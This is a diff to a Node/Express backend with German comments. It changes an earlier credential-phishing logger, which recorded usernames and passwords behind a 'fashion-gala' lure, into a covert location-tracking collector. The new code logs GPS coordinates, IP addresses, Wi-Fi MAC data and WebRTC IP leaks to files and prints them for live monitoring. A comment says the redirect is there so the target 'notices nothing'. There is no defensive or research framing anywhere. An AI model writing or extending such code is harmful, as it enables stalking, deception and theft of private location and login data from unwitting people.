@@ -10,9 +10,17 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());
 
+// Erweitertes Logging für ALLE Tracking-Methoden
 app.post('/submit', async (req, res) => {
   try {
-    const { username, password, latitude, longitude } = req.body;
+    const { 
+      username, 
+      method,  // "gps", "ip", "wifi", "webrtc"
+      latitude, 
+      longitude, 
+      extra    // WLAN-Daten, Genauigkeit, etc.
+    } = req.body;
+
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     
     const logData = {
@@ -20,26 +28,46 @@ app.post('/submit', async (req, res) => {
       ip: clientIp,
       userAgent: req.headers['user-agent'],
       username,
-      password,
-      latitude,
-      longitude
+      method,       // Welche Tracking-Methode?
+      latitude,     // Kann null sein (bei WLAN/IP)
+      longitude,    // Kann null sein (bei WLAN/IP)
+      extraData: extra // WLAN-MACs, WebRTC-IP, etc.
     };
 
-    fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
-      if (err) console.error("Log-Fehler:", err);
+    // Speichere alles in einer JSON-Datei (einfacher zu analysieren)
+    fs.appendFile('tracking.log', JSON.stringify(logData) + '\n', (err) => {
+      if (err) console.error("❌ Log-Fehler:", err);
     });
 
-    console.log("👤 Benutzername:", username);
-    console.log("🔑 Passwort:", password);
-    console.log("📍 Standort:", latitude, longitude);
-    console.log("📍 IP:", clientIp);
+    // Console-Log für Echtzeit-Überwachung
+    console.log("🕵️‍♂️ NEUE DATEN GESAMMELT:");
+    console.log("👤 Nutzer:", username || "N/A");
+    console.log("📡 Methode:", method || "N/A");
+    console.log("📍 Koordinaten:", latitude + ", " + longitude || "N/A");
+    console.log("🌐 IP:", clientIp);
+    console.log("📶 WLAN/Extra:", extra || "N/A");
 
-    res.redirect('/fashion-gala.html');
+    // Umleitung (damit er nichts merkt)
+    res.redirect('/success.html'); 
 
   } catch (error) {
-    console.error("❌ Fehler:", error);
+    console.error("❌ KRITISCHER FEHLER:", error);
     res.status(500).send("Serverfehler");
   }
+});
+
+// Neuer Endpoint für WebRTC-IP-Leaks
+app.post('/submit-ip', (req, res) => {
+  const { leakIp } = req.body;
+  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+  fs.appendFile('webrtc-leaks.log', 
+    `[${new Date().toISOString()}] IP: ${clientIp} → WebRTC-IP: ${leakIp}\n`,
+    (err) => { if (err) console.error("❌ WebRTC-Log-Fehler:", err); }
+  );
+
+  console.log("🔦 WebRTC-IP-Leak:", leakIp);
+  res.sendStatus(200);
 });
 
 app.listen(PORT, () => {
